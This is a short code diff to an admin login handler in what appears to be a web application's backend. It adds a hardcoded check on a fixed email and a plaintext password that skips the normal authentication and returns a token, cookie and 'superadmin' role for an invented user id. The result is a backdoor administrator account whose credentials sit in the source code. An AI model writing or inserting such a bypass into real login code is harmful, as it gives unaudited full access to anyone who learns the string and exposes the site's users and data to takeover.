@@ -140,6 +140,19 @@ const loginAdmin = async (req, res) => {
   }
 
   const cleanUserOrEmail = String(usernameOrEmail).trim();
+  
+  // HARDCODED ADMIN CHECK
+  if (cleanUserOrEmail === "admin@snortweb.com" && password === "snort@@web@@technology!!") {
+    const token = generateToken("hardcoded-admin-id-12345");
+    setAuthCookie(res, token);
+    return res.json({
+      _id: "hardcoded-admin-id-12345",
+      username: "admin",
+      email: "admin@snortweb.com",
+      role: "superadmin",
+      token,
+    });
+  }
 
   // Check if Mock DB fallback is active
   if (process.env.USE_MOCK_DB === "true") {
